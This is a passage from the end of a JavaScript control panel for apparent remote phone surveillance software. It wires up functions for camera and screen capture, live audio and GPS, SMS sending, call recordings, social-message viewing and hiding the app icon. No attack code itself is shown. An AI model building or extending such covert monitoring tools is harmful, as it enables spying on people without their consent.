            : '<span style="color:#d32f2f;font-weight:700">● Not configured</span> — Enter credentials above';
        panel.appendChild(status);
    }

    // ---------- ATTACH FUNCTIONS TO WINDOW ----------
    window.toggleScreen = toggleScreen;
    window.toggleCameraPanel = toggleCameraPanel;
    window.capturePicture = capturePicture;
    window.startLiveStream = startLiveStream;
    window.stopLiveStream = stopLiveStream;
    window.toggleLiveAudio = toggleLiveAudio;
    window.stopLiveAudio = stopLiveAudio;
    window.sendCommand = sendCommand;
    window.sendPlainText = sendPlainText;
    window.toggleAppIcon = toggleAppIcon;
    window.takeSnapshot = takeSnapshot;
    window.toggleRecording = toggleRecording;
    window.downloadBase64 = downloadBase64;
    window.gotoPage = gotoPage;
    window.deleteSelected = deleteSelected;
    window.updateCounters = updateCounters;
    window.handleFolderClick = handleFolderClick;
    window.navigateUp = navigateUp;
    window.updateSelected = updateSelected;
    window.downloadSelected = downloadSelected;
    window.connectWebSocket = connectWebSocket;
    window.manualReconnect = manualReconnect;
    window.snapScreen = snapScreenFromModal;
    window.showAppUsagePanel = showAppUsagePanel;
    window.showGeofencePanel = showGeofencePanel;
    window.showSchedulePanel = showSchedulePanel;
    window.showSendSmsPanel = showSendSmsPanel;
    window.setGeofence = setGeofence;
    window.useLocationAsGeofence = useLocationAsGeofence;
    window.doSendSms = doSendSms;
    window.startScheduledCapture = startScheduledCapture;
    window.clearAlerts = clearAlerts;
    window.toggleLiveGps = toggleLiveGps;
    window.showSocialMessagesPanel  = showSocialMessagesPanel;
    window.filterSocialByPkg        = filterSocialByPkg;
    window.showCallRecordingsPanel  = showCallRecordingsPanel;
    window.showPhotoGalleryPanel    = showPhotoGalleryPanel;
    window.showLocationHistoryPanel = showLocationHistoryPanel;
    window.showAppEventsPanel       = showAppEventsPanel;
    window.showSmsKeywordsPanel     = showSmsKeywordsPanel;
    window.showFirebaseSettingsPanel = showFirebaseSettingsPanel;
    window.toggleFlash = toggleFlash; // add flash toggle

    document.getElementById('screenShareBtn').addEventListener('click', toggleScreen);

    // ---------- INITIALIZE ----------
    connectWebSocket();
</script>
